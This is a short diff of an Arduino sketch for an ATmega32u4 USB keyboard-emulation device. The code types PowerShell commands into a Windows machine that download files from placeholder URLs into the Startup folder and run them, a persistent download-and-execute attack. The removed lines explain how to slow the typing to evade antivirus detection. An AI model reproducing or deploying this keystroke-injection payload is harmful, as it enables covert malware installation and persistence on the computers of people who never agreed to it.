@@ -28,9 +28,6 @@ void setup() {
   // Define download URLs and target path
   fastType("$s=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'");
   fastType("Invoke-WebRequest 'INPUT RAW HTTPS LINK HERE' -OutFile ($s+'NAME')");
-  //some AVs have a signature detection for very fast consecutive typing thus this code snippet BELOW can be used for avoiding it.
-  fastType("Start-Sleep -Seconds 1");
-  // completely optional^^^^
   fastType("Invoke-WebRequest 'PLACEHOLDER' -OutFile ($s+'PLACEHOLDER')");
   fastType("Start-Process ($s+'PLACEHOLDER')");
 
@@ -40,6 +37,7 @@ void setup() {
 
 void loop() {}
 //THIS IS MEANT TO BE USED WITH ATmega32u4 CHIPSET, but any HID compatible board can be used...
+
 
 
 
